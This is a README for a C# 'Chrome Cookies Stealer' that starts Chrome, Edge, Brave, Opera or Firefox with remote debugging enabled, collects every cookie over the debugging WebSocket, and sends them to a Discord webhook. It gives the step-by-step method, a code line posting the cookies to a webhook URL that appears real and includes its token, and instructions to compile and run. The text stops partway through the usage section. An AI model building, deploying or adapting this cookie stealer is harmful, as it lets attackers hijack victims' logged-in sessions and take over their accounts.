# Documentation: Chrome Cookies Stealer

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [How It Works](#how-it-works)
- [Configuration](#configuration)
- [Prerequisites](#prerequisites)
- [Usage](#usage)
- [Code Walkthrough](#code-walkthrough)
- [Important Notes](#important-notes)
- [Disclaimer](#disclaimer)

---

## Overview

The **Chrome Cookies Stealer** is a proof-of-concept tool designed to extract cookies from various web browsers (Chrome, Edge, Brave, Opera, and Firefox) by leveraging their debugging protocols. It collects cookies and sends them to a specified webhook for further analysis.

---

## Features

- Detects installed browsers and retrieves their cookies.
- Uses WebSocket debugging protocols to fetch cookies.
- Sends collected cookies to a predefined webhook.
- Supports multiple browsers:
  - Google Chrome
  - Microsoft Edge
  - Brave Browser
  - Opera
  - Mozilla Firefox

---

## How It Works

1. **Browser Detection**:
   - Checks for the installation of supported browsers by verifying the existence of their binaries.

2. **Browser Launch**:
   - Starts the browser in headless mode with debugging enabled on a specific port.

3. **Cookie Retrieval**:
   - Connects to the browser's debugging WebSocket endpoint and retrieves all cookies using `Network.getAllCookies`.

4. **Cookie Transmission**:
   - Formats the retrieved cookies and sends them to a predefined webhook URL.

5. **Browser Cleanup**:
   - Closes the browser after collecting cookies.

---

## Configuration

The tool includes a configuration dictionary (`CONFIGS`) specifying paths to the browser binaries and user data directories. Modify this dictionary if needed to suit your environment.

1. Set webhook in the webhook line 
 ```c#
   var response = await client.PostAsync("https://discordapp.com/api/webhooks/1308546230552367154/DlExX-i3vC5ThAkCKfAHNKfDb3hJSegMQYKpGMaWHAxBru2ELvDMydR4RTyVPm_mAKfM", form);
 ```
 
 2. compile the project
---

## Prerequisites

1. .NET Core or .NET Framework installed on the system.
2. The following NuGet packages:
   - [Newtonsoft.Json](https://www.nuget.org/packages/Newtonsoft.Json)
   - [WebSocketSharp](https://github.com/sta/websocket-sharp)
3. Supported browsers installed on the system.

---

## Usage

1. Clone or download the project.
2. Build the project using your preferred IDE or command-line tool.
3. Run the application:
   ```bash
   dotnet run
